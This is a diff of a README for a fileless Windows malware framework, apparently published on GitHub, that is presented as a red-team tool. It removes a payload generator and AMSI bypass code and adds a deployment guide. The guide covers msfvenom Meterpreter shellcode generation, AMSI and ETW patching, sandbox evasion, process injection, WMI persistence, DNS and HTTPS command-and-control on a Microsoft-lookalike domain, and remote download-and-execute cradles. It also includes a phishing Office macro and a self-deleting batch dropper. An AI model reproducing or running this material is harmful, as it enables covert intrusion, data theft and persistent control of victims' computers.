@@ -1,485 +1,680 @@
 <div align="center">
+  <img src="assets/logo.png" alt="File-Less-Malware Logo" width="220"/>
 
-```
-███████╗██╗██╗     ███████╗      ██╗     ███████╗███████╗███████╗
-██╔════╝██║██║     ██╔════╝      ██║     ██╔════╝██╔════╝██╔════╝
-█████╗  ██║██║     █████╗  ████████║     █████╗  ███████╗███████╗
-██╔══╝  ██║██║     ██╔══╝  ╚═══████║     ██╔══╝  ╚════██║╚════██║
-██║     ██║███████╗███████╗    ████║     ███████╗███████║███████║
-╚═╝     ╚═╝╚══════╝╚══════╝    ╚═══╝     ╚══════╝╚══════╝╚══════╝
+  <h1>File-Less-Malware</h1>
+  <p><strong>Advanced Fileless Malware Framework for Red Team Operations</strong></p>
+  <p><em>For authorized security testing only</em></p>
 
-███╗   ███╗ ██████╗ ██╗    ██╗ █████╗ ██████╗ ███████╗
-████╗ ████║██╔════╝ ██║    ██║██╔══██╗██╔══██╗██╔════╝
-██╔████╔██║██║  ███╗██║ █╗ ██║███████║██████╔╝█████╗  
-██║╚██╔╝██║██║   ██║██║███╗██║██╔══██║██╔══██╗██╔══╝  
-██║ ╚═╝ ██║╚██████╔╝╚███╔███╔╝██║  ██║██║  ██║███████╗
-╚═╝     ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
-```
+  <br/>
 
-# File-Less-M@lware
-
-**Advanced File-Less-M@lware Framework — Full Source, Build & Deployment**
-
-[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=for-the-badge&logo=powershell&logoColor=white)](https://microsoft.com/powershell)
-[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://microsoft.com)
-[![License](https://img.shields.io/badge/License-Educational-red?style=for-the-badge)](#)
-[![Maintenance](https://img.shields.io/badge/Maintained-Yes-green?style=for-the-badge)](#)
-[![Stage](https://img.shields.io/badge/Stages-5-blueviolet?style=for-the-badge)](#)
-[![C2](https://img.shields.io/badge/C2-DNS%20%2B%20HTTPS-orange?style=for-the-badge)](#)
-
-> Complete project with full source code, build instructions, and deployment guide.
-
----
+  [![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
+  [![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=flat-square&logo=powershell&logoColor=white)](https://microsoft.com/powershell)
+  [![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)](https://microsoft.com)
+  [![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
+  [![Stages](https://img.shields.io/badge/Stages-5-blueviolet?style=flat-square)](#architecture)
+  [![C2](https://img.shields.io/badge/C2-DNS%20%2B%20HTTPS-orange?style=flat-square)](#c2-server-setup)
+  [![Red Team](https://img.shields.io/badge/Use-Red%20Team%20Only-red?style=flat-square)](#legal--ethical-use)
 
 </div>
 
-## Project Structure
+---
+
+## Table of Contents
+
+1. [Overview](#overview)
+2. [What Makes This "Fileless"?](#what-makes-this-fileless)
+3. [Architecture](#architecture)
+4. [Prerequisites](#prerequisites)
+5. [Installation & Setup](#installation--setup)
+6. [Step-by-Step Deployment Guide](#step-by-step-deployment-guide)
+7. [C2 Server Setup](#c2-server-setup)
+8. [Execution Methods](#execution-methods)
+9. [Persistence Mechanisms](#persistence-mechanisms)
+10. [Evasion Techniques](#evasion-techniques)
+11. [Detection & OPSEC Considerations](#detection--opsec-considerations)
+12. [Troubleshooting](#troubleshooting)
+13. [Legal & Ethical Use](#legal--ethical-use)
+14. [Signed](#signed)
+
+---
+
+## Overview
+
+File-Less-Malware is a multi-stage fileless malware framework designed for red team engagements and authorized penetration tests. It operates entirely in memory — no executables, scripts, or payloads are ever written to disk. The framework uses living-off-the-land binaries (LOLBins), Windows API injection, WMI persistence, and dual-channel C2 communication to establish persistent, stealthy access to target Windows systems.
+
+This is not a script kiddie tool. It implements advanced evasion techniques including AMSI patching, ETW suppression, sandbox detection, encrypted shellcode transport, and process injection with memory protection manipulation.
+
+---
+
+## What Makes This "Fileless"?
+
+Traditional malware writes an executable or script file to disk, which antivirus can scan at rest. File-Less-Malware avoids this entirely:
+
+| Attack Phase | What Touches Disk | What Stays in Memory |
+|---|---|---|
+| Initial execution | Nothing | Encoded PowerShell command runs directly |
+| AMSI/ETW bypass | Nothing | API memory patching |
+| Shellcode | Nothing | XOR-encrypted in transit, decrypted in memory only |
+| Process injection | Nothing | VirtualAllocEx + WriteProcessMemory in target process |
+| Persistence | WMI Repository (system file, not user-writable) | No `.exe`, `.dll`, `.ps1`, `.vbs`, `.bat` on disk |
+| C2 communication | Nothing | DNS queries + HTTPS requests (normal network traffic) |
+
+The WMI repository is a system-managed database — you cannot simply delete a WMI subscription by removing a file. This makes forensic removal significantly harder than traditional persistence methods.
+
+---
+
+## Architecture
 
 ```
-skynetfc/
+┌──────────────────────────────────────────────────────────────────────┐
+│                    File-Less-Malware Framework                       │
+├──────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│  Execution Order:                                                    │
+│                                                                      │
+│  1. STAGE 0 — Defense Bypass                                         │
+│     ├── AmsiUtils amsiInitFailed = true                              │
+│     ├── AmsiScanBuffer memory patch (xor rax,rax; ret)               │
+│     └── EtwEventWrite memory patch (xor rax,rax; ret)                │
+│                                                                      │
+│  2. STAGE 1 — Sandbox Evasion                                        │
+│     ├── BIOS serial check (VM defaults)                              │
+│     ├── System model check (VirtualBox, VMware, Hyper-V)             │
+│     ├── RAM size check (< 4GB = sandbox)                             │
+│     ├── Disk size check (< 60GB = sandbox)                           │
+│     ├── Running process check (procmon, wireshark, debuggers)        │
+│     ├── Username check (admin, test, sandbox, analysis)              │
+│     └── Network gateway check (10.0.2.x = NAT)                      │
+│                                                                      │
+│  3. STAGE 2 — Shellcode Decryption                                   │
+│     ├── Base64 decode                                                │
+│     ├── Rolling XOR decryption (16-byte key)                         │
+│     └── Shellcode ready in memory                                    │
+│                                                                      │
+│  4. STAGE 3 — Process Injection                                      │
+│     ├── Find or spawn notepad.exe (sacrificial process)              │
+│     ├── OpenProcess (PROCESS_ALL_ACCESS)                             │
+│     ├── VirtualAllocEx (RW memory in target)                         │
+│     ├── WriteProcessMemory (shellcode → target)                      │
+│     ├── VirtualProtectEx (RW → RX, executable)                       │
+│     └── CreateRemoteThread (execute)                                 │
+│                                                                      │
+│  5. STAGE 4 — Persistence (optional)                                 │
+│     ├── WMI Event Subscription (primary)                             │
+│     ├── Registry Run Key (backup)                                    │
+│     └── Scheduled Task (tertiary)                                    │
+│                                                                      │
+│  6. STAGE 5 — C2 Beacon (infinite loop)                              │
+│     ├── System info collection                                       │
+│     ├── DNS tunneling beacon (subdomain exfiltration)                │
+│     ├── HTTPS callback (command retrieval)                           │
+│     └── Jittered sleep (entropy spin-loop)                           │
+│                                                                      │
+└──────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Prerequisites
+
+### Attacker Machine (Kali Linux / VPS)
+
+| Requirement | Details |
+|---|---|
+| OS | Kali Linux 2024+ or Ubuntu 22.04+ |
+| Python | 3.8+ |
+| msfvenom | Metasploit Framework (`apt install metasploit-framework`) |
+| Python packages | `dnslib` (`pip3 install dnslib`) |
+| Root access | Required for DNS (port 53) and HTTPS (port 443) listeners |
+| Domain | A domain you control (or use IP-only with limitations) |
+| Public IP | VPS with ports 53/443 open (or forwarded) |
+
+### Target Machine (Windows)
+
+| Requirement | Details |
+|---|---|
+| OS | Windows 10/11, Windows Server 2019/2022 |
+| PowerShell | Version 5.1+ |
+| Privileges | Admin recommended for WMI persistence features |
+| Network | Outbound DNS (port 53) and HTTPS (port 443) |
+| Windows Defender | Will be bypassed by Stage 0 (amsiInitFailed) |
+
+---
+
+## Installation & Setup
+
+### 1. Clone the Project
+
+```bash
+git clone https://github.com/skynetfc/file-less-malware.git
+cd file-less-malware
+```
+
+### 2. Install Dependencies
+
+```bash
+# Python dependencies for C2 server
+pip3 install dnslib
+
+# Metasploit for shellcode generation
+sudo apt update && sudo apt install -y metasploit-framework
+```
+
+### 3. Directory Structure
+
+```
+file-less-malware/
 ├── README.md
+├── LICENSE
+├── assets/
+│   └── logo.png
 ├── builder/
-│   ├── generate_payload.py
-│   ├── encrypt_shellcode.py
-│   └── setup_c2.py
+│   ├── generate_payload.py      ← Shellcode + encryption generator
+│   └── encrypt_shellcode.py     ← XOR encryption utility
 ├── payload/
-│   ├── stage0_amsi_bypass.ps1
-│   ├── stage1_sandbox_evasion.ps1
-│   ├── stage2_injection.ps1
-│   ├── stage3_persistence.ps1
-│   ├── stage4_c2_beacon.ps1
-│   └── loader.ps1
+│   ├── stage0_amsi_bypass.ps1   ← AMSI/ETW patching module
+│   ├── stage1_sandbox_evasion.ps1 ← VM/sandbox detection
+│   ├── stage2_injection.ps1     ← Process injection engine
+│   ├── stage3_persistence.ps1   ← WMI/Registry persistence
+│   ├── stage4_c2_beacon.ps1     ← C2 communication loop
+│   └── loader.ps1               ← Master orchestrator (ALL stages)
 ├── c2/
-│   ├── server.py
-│   ├── dns_server.py
+│   ├── server.py                ← Combined HTTPS + DNS C2 server
+│   ├── dns_server.py            ← Standalone DNS listener
 │   └── requirements.txt
+├── generated/                   ← Created by build process
+│   ├── shellcode.raw
+│   ├── shellcode.enc
+│   └── stager.ps1
 └── docs/
     └── OPERATIONS_GUIDE.md
 ```
 
 ---
 
-## 1. `builder/generate_payload.py`
+## Step-by-Step Deployment Guide
 
-```python
-#!/usr/bin/env python3
-"""
-File-Less-M@lware Payload Generator
-Generates shellcode and encrypts it for the fileless loader
-# Signed: skynetfc
-"""
+### Phase 1: Generate the Payload
 
-import os
-import sys
-import base64
-import argparse
-import subprocess
-import tempfile
-from typing import List, Tuple
+#### Step 1.1 — Generate Meterpreter Shellcode
 
-# XOR encryption key (16 bytes)
-ENCRYPTION_KEY = bytes([0x41, 0x5E, 0x3F, 0x2A, 0x77, 0x8B, 0x9C, 0xD1,
-                        0xE2, 0x0F, 0x4C, 0x66, 0x33, 0x19, 0xAA, 0xBD])
-
-def check_msfvenom() -> bool:
-    try:
-        subprocess.run(['msfvenom', '--version'], capture_output=True, check=True)
-        return True
-    except (subprocess.CalledProcessError, FileNotFoundError):
-        return False
-
-def generate_shellcode(lhost: str, lport: int, payload_type: str = 'reverse_https',
-                       architecture: str = 'x64') -> bytes:
-    arch_map = {'x64': 'x64', 'x86': 'x86'}
-    payload_map = {
-        'reverse_tcp':   f'windows/{arch_map[architecture]}/meterpreter/reverse_tcp',
-        'reverse_https': f'windows/{arch_map[architecture]}/meterpreter/reverse_https',
-        'reverse_http':  f'windows/{arch_map[architecture]}/meterpreter/reverse_http',
-        'bind_tcp':      f'windows/{arch_map[architecture]}/meterpreter/bind_tcp',
-    }
-    if payload_type not in payload_map:
-        print(f"[!] Unknown payload type: {payload_type}")
-        sys.exit(1)
-    msf_payload = payload_map[payload_type]
-    print(f"[*] Generating {msf_payload} LHOST={lhost} LPORT={lport}")
-    cmd = ['msfvenom', '-p', msf_payload, f'LHOST={lhost}', f'LPORT={lport}', '-f', 'raw', '-o', '-']
-    result = subprocess.run(cmd, capture_output=True)
-    if result.returncode != 0:
-        print(f"[!] msfvenom failed: {result.stderr.decode()}")
-        sys.exit(1)
-    return result.stdout
-
-def generate_custom_shellcode_from_file(filepath: str) -> bytes:
-    with open(filepath, 'rb') as f:
-        return f.read()
-
-def xor_encrypt(data: bytes, key: bytes = ENCRYPTION_KEY) -> bytes:
-    result = bytearray(len(data))
-    for i in range(len(data)):
-        result[i] = data[i] ^ key[i % len(key)]
-    return bytes(result)
-
-def encrypt_shellcode(shellcode: bytes) -> Tuple[str, str]:
-    encrypted = xor_encrypt(shellcode)
-    b64_encoded = base64.b64encode(encrypted).decode()
-    cs_array = "new byte[] { " + ", ".join(f"0x{b:02x}" for b in encrypted) + " }"
-    return b64_encoded, cs_array
-
-def generate_powershell_array(shellcode: bytes) -> str:
-    lines = []
-    for i in range(0, len(shellcode), 12):
-        chunk = shellcode[i:i+12]
-        hex_bytes = ", ".join(f"0x{b:02x}" for b in chunk)
-        lines.append(f"    {hex_bytes},")
-    return "\n".join(lines)
-
-def create_stager(base64_encrypted: str) -> str:
-    return f'''# File-Less-M@lware - Fileless Payload Stager
-# Generated: {__import__('datetime').datetime.now().isoformat()}
-
-# XOR Decryption Key
-$encKey = @({', '.join(f'0x{b:02x}' for b in ENCRYPTION_KEY)})
-
-# Encrypted shellcode (base64)
-$encryptedB64 = "{base64_encrypted}"
-
-# Decode and decrypt in memory
-$encryptedBytes = [Convert]::FromBase64String($encryptedB64)
-$decrypted = New-Object Byte[] $encryptedBytes.Length
-for($i=0; $i -lt $encryptedBytes.Length; $i++) {{
-    $decrypted[$i] = $encryptedBytes[$i] -bxor $encKey[$i % $encKey.Length]
-}}
-
-Write-Host "[+] Shellcode decrypted ({{$($decrypted.Length)}} bytes)"
-Write-Host "[+] Ready for injection..."
-'''
-
-def generate_payload(lhost: str, lport: int, payload_type: str = 'reverse_https',
-                     architecture: str = 'x64', shellcode_file: str = None,
-                     output_dir: str = 'generated'):
-    print("""
-    ╔══════════════════════════════════════════╗
-    ║     File-Less-M@lware Payload Generator  ║
-    ║    Advanced File-Less-M@lware Framework  ║
-    ╚══════════════════════════════════════════╝
-    """)
-    os.makedirs(output_dir, exist_ok=True)
-    if shellcode_file:
-        print(f"[*] Loading shellcode from: {shellcode_file}")
-        shellcode = generate_custom_shellcode_from_file(shellcode_file)
-    elif check_msfvenom():
-        print("[*] Using msfvenom for shellcode generation")
-        shellcode = generate_shellcode(lhost, lport, payload_type, architecture)
-    else:
-        print("[!] msfvenom not found. Provide a raw shellcode file with --shellcode")
-        sys.exit(1)
-    print(f"[+] Shellcode size: {len(shellcode)} bytes")
-    b64_encrypted, cs_array = encrypt_shellcode(shellcode)
-    stager = create_stager(b64_encrypted)
-    raw_output = os.path.join(output_dir, 'shellcode.raw')
-    with open(raw_output, 'wb') as f:
-        f.write(shellcode)
-    print(f"[+] Saved raw shellcode: {raw_output}")
-    encrypted_output = os.path.join(output_dir, 'shellcode.enc')
-    with open(encrypted_output, 'wb') as f:
-        f.write(base64.b64decode(b64_encrypted))
-    print(f"[+] Saved encrypted shellcode: {encrypted_output}")
-    stager_output = os.path.join(output_dir, 'stager.ps1')
-    with open(stager_output, 'w') as f:
-        f.write(stager)
-    print(f"[+] Saved loader stager: {stager_output}")
-    print(f"""
-    ╔══════════════════════════════════════════╗
-    ║           GENERATION COMPLETE            ║
-    ╠══════════════════════════════════════════╣
-    ║  Payload  : {payload_type:<29} ║
-    ║  LHOST    : {lhost:<29} ║
-    ║  LPORT    : {lport:<29} ║
-    ║  Arch     : {architecture:<29} ║
-    ║  Size     : {len(shellcode):<8} bytes                 ║
-    ║  Encrypted: {b64_encrypted[:40]}...  ║
-    ╚══════════════════════════════════════════╝
-    """)
-    return stager
-
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='File-Less-M@lware Payload Generator')
-    parser.add_argument('--lhost', required=True, help='Callback IP address')
-    parser.add_argument('--lport', type=int, default=443, help='Callback port')
-    parser.add_argument('--payload', default='reverse_https',
-                        choices=['reverse_tcp', 'reverse_https', 'reverse_http', 'bind_tcp'])
-    parser.add_argument('--arch', default='x64', choices=['x64', 'x86'])
-    parser.add_argument('--shellcode', help='Raw shellcode file (bypasses msfvenom)')
-    parser.add_argument('--output', default='generated', help='Output directory')
-    args = parser.parse_args()
-    generate_payload(args.lhost, args.lport, args.payload, args.arch, args.shellcode, args.output)
-```
-
----
-
-## 2. `payload/stage0_amsi_bypass.ps1`
-
-```powershell
-<#
-.SYNOPSIS
-    File-Less-M@lware Stage 0 - AMSI & ETW Patching
-    Bypasses AMSI (Anti-Malware Scan Interface) and ETW (Event Tracing for Windows)
-    to execute payloads undetected.
-.DESCRIPTION
-    Implements multiple AMSI bypass techniques and ETW patching.
-    All operations happen entirely in memory with no disk writes.
-#>
-
-function Invoke-SkynetFC_AMSI_Bypass {
-    Write-Verbose "[SkynetFC] Patching AMSI..."
-
-    # Technique 1: AmsiUtils amsiInitFailed (works on PS 5.1)
-    try {
-        $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-        if ($Ref) {
-            $Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-            Write-Verbose "[SkynetFC] AMSI Bypass 1/4: amsiInitFailed = true"
-        }
-    } catch { Write-Verbose "[SkynetFC] AMSI Bypass 1/4 failed (non-critical)" }
-
-    # Technique 2: Registry override
-    try {
-        $paths = @(
-            "HKLM:\SOFTWARE\Microsoft\AMSI\Providers",
-            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\AMSI\Providers"
-        )
-        foreach ($p in $paths) {
-            if (Test-Path $p) {
-                $providers = Get-ItemProperty $p
-                foreach ($prov in $providers.PSObject.Properties) {
-                    $null = Remove-Item -Path "$p\$($prov.Name)" -Force -ErrorAction SilentlyContinue
-                }
-            }
-        }
-        Write-Verbose "[SkynetFC] AMSI Bypass 2/4: Providers removed"
-    } catch { Write-Verbose "[SkynetFC] AMSI Bypass 2/4 failed (non-critical)" }
-
-    # ... (see full source in payload/stage0_amsi_bypass.ps1)
-}
-```
-
----
-
-## 3. `payload/stage1_sandbox_evasion.ps1`
-
-Checks for VM artifacts, analysis tools, and environmental anomalies. Returns `$true` if a sandbox/VM is detected.
-
-**Checks performed:**
-- BIOS serial number (VMware / VirtualBox / QEMU / Xen / Bochs)
-- Motherboard product & manufacturer
-- System model & manufacturer
-- CPU count < 2
-- RAM < 4 GB
-- Disk size < 60 GB
-- Known analysis processes (procmon, wireshark, x64dbg, ida64, etc.)
-- Suspicious usernames (admin, user, test, sandbox, malware, analysis)
-- VirtualBox Guest Additions registry key
-- VMware Tools registry key
-- Suspicious hostname
-- Default gateway (VirtualBox NAT: 10.0.2.1 / 10.0.2.2)
-
----
-
-## 4. `payload/stage2_injection.ps1`
-
-Injects decrypted shellcode into a sacrificial process using:
-
-| Method | Description |
-|---|---|
-| `RemoteThread` | Classic `CreateRemoteThread` injection |
-| `APC` | `QueueUserAPC` thread-less injection |
-| `Hollowing` | Process Hollowing via NT API |
-
-All operations are **memory-only** — nothing touches disk.
-
----
-
-## 5. `payload/stage3_persistence.ps1`
-
-Establishes persistence using three layered methods:
-
-| Method | Mechanism |
-|---|---|
-| Primary | WMI `__EventFilter` + `CommandLineEventConsumer` binding |
-| Backup | Registry `Run` / `RunOnce` key (HKCU + HKLM) |
-| Tertiary | Scheduled Task (daily trigger, SYSTEM principal) |
-
-All persistence names use random suffixes to avoid signature matching.  
-Includes `Remove-SkynetFC_Persistence` for full cleanup.
-
----
-
-## 6. `payload/stage4_c2_beacon.ps1`
-
-Multi-channel C2 with jitter-based beaconing:
-
-| Channel | Method |
-|---|---|
-| Primary | DNS tunneling (encoded data in subdomain queries) |
-| Secondary | HTTPS callback to `/api/telemetry` (TLS 1.2/1.3) |
-
-**Features:**
-- Collects hostname, username, domain, OS, admin status, arch, PID, timestamp
-- Encodes beacon data as JSON → Base64
-- Jitter sleep uses `RNGCryptoServiceProvider` entropy loop to defeat fast-forward sandboxes
-- Parses `<c2>command</c2>` tags from HTTPS response
-
----
-
-## 7. `payload/loader.ps1` — Main Orchestrator
-
-```powershell
-# File-Less-M@lware - Complete Fileless Loader
-# Orchestrates all stages: AMSI bypass -> Sandbox check ->
-# Process injection -> Persistence -> C2 beacon
-```
-
-**Configuration block:**
-
-```powershell
-$config = @{
-    C2Domain        = "update.microsoft-helpline.com"   # CHANGE THIS
-    C2Port          = 443
-    BeaconInterval  = 120
-    JitterPercent   = 35
-    TargetProcess   = "notepad.exe"
-    InjectionMethod = "RemoteThread"
-    PersistEnabled  = $true
-    PersistInterval = 3600
-    EncryptedShellcode = "PLACEHOLDER_ENCRYPTED_BASE64_SHELLCODE"
-    EncryptionKey   = @(0x41, 0x5E, 0x3F, 0x2A, 0x77, 0x8B, 0x9C, 0xD1,
-                        0xE2, 0x0F, 0x4C, 0x66, 0x33, 0x19, 0xAA, 0xBD)
-}
-```
-
-**Execution stages:**
-
-```
-Stage 0  →  AMSI & ETW bypass (inline, no imports)
-Stage 1  →  Sandbox & VM detection (exit cleanly if caught)
-Stage 2  →  Decrypt shellcode (XOR + Base64 in-memory)
-Stage 3  →  Process injection into target PID
-Stage 4  →  Persistence (WMI + Registry)
-Stage 5  →  C2 beacon loop (DNS + HTTPS, jitter sleep)
-```
-
----
-
-## 8. `c2/server.py` — C2 Server
-
-```python
-#!/usr/bin/env python3
-"""
-File-Less-M@lware C2 Server
-Listens for DNS and HTTPS beacons from implants.
-"""
-```
-
-Starts two listeners:
-
-| Listener | Port | Protocol |
-|---|---|---|
-| HTTP/S handler | 443 (default) | HTTPS — `/api/telemetry` |
-| DNS server | 53 (default) | UDP — subdomain-encoded beacon data |
-
----
-
-## Deployment
-
-### Step 1 — Generate shellcode
+On Kali Linux, run the payload generator:
 
 ```bash
-# On Kali Linux with msfvenom
-cd skynetfc/builder
-
+cd file-less-malware/builder
 python3 generate_payload.py \
-  --lhost YOUR_C2_IP \
+  --lhost YOUR_C2_SERVER_IP \
   --lport 443 \
   --payload reverse_https \
   --arch x64 \
   --output ../generated
-
-# Output:
-# [+] Generated: ../generated/shellcode.raw
-# [+] Generated: ../generated/shellcode.enc
-# [+] Generated: ../generated/stager.ps1
 ```
 
-### Step 2 — Integrate into the loader
+This will:
+1. Run `msfvenom` to create staged reverse HTTPS shellcode
+2. XOR-encrypt the shellcode with a 16-byte rolling key
+3. Save the raw shellcode to `generated/shellcode.raw`
+4. Save the encrypted shellcode to `generated/shellcode.enc`
+5. Generate a standalone stager to `generated/stager.ps1`
+
+**Flags explained:**
+
+| Flag | Purpose | Example |
+|---|---|---|
+| `--lhost` | Your C2 server IP | `192.168.1.100` or `45.33.32.156` |
+| `--lport` | Port for reverse connection | `443` (blends with HTTPS) |
+| `--payload` | Shellcode type | `reverse_https` (encrypted, harder to detect) |
+| `--arch` | Target architecture | `x64` (most modern systems) |
+
+#### Step 1.2 — Get the Encrypted Payload String
 
 ```bash
-# Get the base64 encrypted shellcode
-cat ../generated/shellcode.enc | base64 | xargs
-
-# Open payload/loader.ps1 and replace:
-#   $config.EncryptedShellcode = "PLACEHOLDER_ENCRYPTED_BASE64_SHELLCODE"
-# with the output from above
-
-# Also change:
-#   $config.C2Domain = "YOUR_DOMAIN_HERE"
+cat ../generated/shellcode.enc | base64 | tr -d '\n'
 ```
 
-### Step 3 — Convert to single-line encoded command
+Save this output — you'll need it for the next step.
+
+### Phase 2: Configure the Loader
+
+#### Step 2.1 — Edit `payload/loader.ps1`
+
+Open `payload/loader.ps1` and find the `$config` block at the top.
+
+**Change these values:**
+
+| Variable | What to Put | Example |
+|---|---|---|
+| `C2Domain` | Your C2 domain or IP | `"c2.yourdomain.com"` |
+| `C2Port` | C2 server port | `443` |
+| `EncryptedShellcode` | The base64 string from Step 1.2 | (long base64 string) |
+
+**Optional tuning:**
+
+| Variable | Default | Description |
+|---|---|---|
+| `BeaconInterval` | `120` | Seconds between C2 callbacks |
+| `JitterPercent` | `35` | Random delay variation (0–100) |
+| `TargetProcess` | `notepad.exe` | Sacrificial process for injection |
+| `PersistEnabled` | `$true` | Enable/disable persistence |
+
+#### Step 2.2 — (Optional) Change XOR Encryption Key
+
+1. Edit `builder/encrypt_shellcode.py` — change the `ENCRYPTION_KEY` bytes
+2. Edit `payload/loader.ps1` — change `$config.EncryptionKey` to match
+3. Regenerate the payload (re-run Step 1.1)
+
+### Phase 3: Encode the Loader
+
+#### Method A: One-Liner for Direct Execution
 
 ```powershell
-# On Windows test box — encode the loader for one-liner execution
-$content = Get-Content payload/loader.ps1 -Raw
+$loaderPath = "C:\path\to\file-less-malware\payload\loader.ps1"
+$content = Get-Content -Raw $loaderPath
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($content)
 $encoded = [Convert]::ToBase64String($bytes)
-Write-Output "powershell -WindowStyle Hidden -EncodedCommand $encoded"
+Write-Host $encoded
 ```
 
-### Step 4 — Deploy C2 server
-
-```bash
-pip install -r c2/requirements.txt
-
-python3 c2/server.py \
-  --domain your-c2-domain.com \
-  --http-port 443 \
-  --dns-port 53
-```
-
-### Step 5 — Execute payload on target
+#### Method B: Download Cradle
 
 ```powershell
-# Option A: Direct
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File loader.ps1
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('https://your-server.com/loader.ps1')"
+```
 
-# Option B: Encoded one-liner (no file on disk)
-powershell -WindowStyle Hidden -EncodedCommand <BASE64_FROM_STEP3>
+### Phase 4: Set Up the C2 Server
 
-# Option C: IEX download cradle (pure fileless)
-powershell -WindowStyle Hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://your-c2/loader.ps1')"
+#### Step 4.1 — Start the C2 Server (as root)
+
+```bash
+sudo python3 c2/server.py \
+  --domain update.microsoft-helpline.com \
+  --http-port 443 \
+  --dns-port 53 \
+  --host 0.0.0.0
+```
+
+Expected output:
+
+```
+[2026-06-20 14:00:00] [C2] Domain: update.microsoft-helpline.com
+[2026-06-20 14:00:00] [C2] HTTP: 0.0.0.0:443
+[2026-06-20 14:00:00] [C2] DNS:  0.0.0.0:53
+[2026-06-20 14:00:00] [C2] Waiting for beacons...
+```
+
+#### Step 4.2 — Configure DNS (if using a domain)
+
+| Record Type | Name | Value | TTL |
+|---|---|---|---|
+| A | `update.microsoft-helpline.com` | `YOUR_C2_SERVER_IP` | 3600 |
+
+#### Step 4.3 — Configure Metasploit Listener
+
+```bash
+msfconsole -q
+
+msf6 > use exploit/multi/handler
+msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
+msf6 > set LHOST 0.0.0.0
+msf6 > set LPORT 443
+msf6 > set ExitOnSession false
+msf6 > run -j
+```
+
+### Phase 5: Deploy on Target
+
+#### Delivery via PowerShell (Direct)
+
+```powershell
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand $ENCODED_LOADER
+```
+
+#### Delivery via Download Cradle
+
+```powershell
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('https://your-server.com/loader.ps1')"
+```
+
+#### Delivery via Office Macro (Phishing)
+
+```vbnet
+Sub AutoOpen()
+    Dim shell As Object
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand ENCODED_LOADER_HERE", 0, False
+End Sub
+```
+
+#### Delivery via Batch File
+
+```batch
+@echo off
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand ENCODED_LOADER_HERE
+del %0
+```
+
+### Phase 6: Verify Implant Callback
+
+Watch your C2 server logs:
+
+```
+[2026-06-20 14:05:32] [BEACON] 203.0.113.50 -> /api/telemetry
+[2026-06-20 14:05:32] [IMPLANT] Hostname: DESKTOP-7F3K2L | User: jdoe | IP: 203.0.113.50
+[2026-06-20 14:05:32] [DNS] Beacon from 203.0.113.50: RGVz... (truncated)
+```
+
+And in Metasploit:
+
+```
+[*] Meterpreter session 1 opened (YOUR_IP:443 -> TARGET_IP:54321)
 ```
 
 ---
 
-## Requirements
+## C2 Server Setup
 
-| Component | Requirement |
-|---|---|
-| Payload builder | Python 3.8+, `msfvenom` (optional) |
-| C2 server | Python 3.8+, `dnslib` |
-| Target | Windows 7+ / PowerShell 5.1+ |
-| Recommended | Kali Linux for builder, VPS for C2 |
+### Option 1: All-in-One Server (Recommended)
+
+```bash
+sudo python3 c2/server.py \
+  --domain yourdomain.com \
+  --http-port 443 \
+  --dns-port 53 \
+  --host 0.0.0.0
+```
+
+### Option 2: Separate Services
+
+```bash
+# Terminal 1: DNS listener
+sudo python3 c2/dns_server.py --port 53 --domain yourdomain.com
+
+# Terminal 2: HTTP listener
+sudo python3 c2/server.py --http-port 443
+```
+
+### What the C2 Server Logs
+
+| Log Type | Example | What It Means |
+|---|---|---|
+| `[BEACON]` | `[BEACON] 203.0.113.50 -> /api/telemetry` | HTTPS callback received |
+| `[IMPLANT]` | `Hostname: DESKTOP-ABC` | System info decoded from beacon |
+| `[DNS]` | `Beacon from 203.0.113.50: aG9zdA==` | DNS subdomain beacon received |
+| `[CMD]` | `Command sent: whoami` | C2 command dispatched to implant |
+
+### Sending Commands to Implants
+
+The C2 server embeds commands in HTTP responses using XML tags. The implant checks for `<c2>COMMAND</c2>` in the response body. Edit `server.py` to customize the command returned.
 
 ---
+
+## Execution Methods
+
+### Method 1: Encoded Command (100% Fileless)
+
+```powershell
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand <BASE64>
+```
+
+**Pros:** Nothing on disk. AV/EDR cannot scan the payload at rest.  
+**Cons:** PowerShell command line may be logged (Event ID 4688, 4104).
+
+### Method 2: Download Cradle
+
+```powershell
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('https://your-server.com/loader.ps1')"
+```
+
+**Pros:** Payload can be updated server-side without re-deploying.  
+**Cons:** Network connection to your server may be logged.
+
+### Method 3: WMI Launcher (Living off the Land)
+
+```cmd
+wmic process call create "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand <BASE64>"
+```
+
+### Method 4: Scheduled Task Execution
+
+```cmd
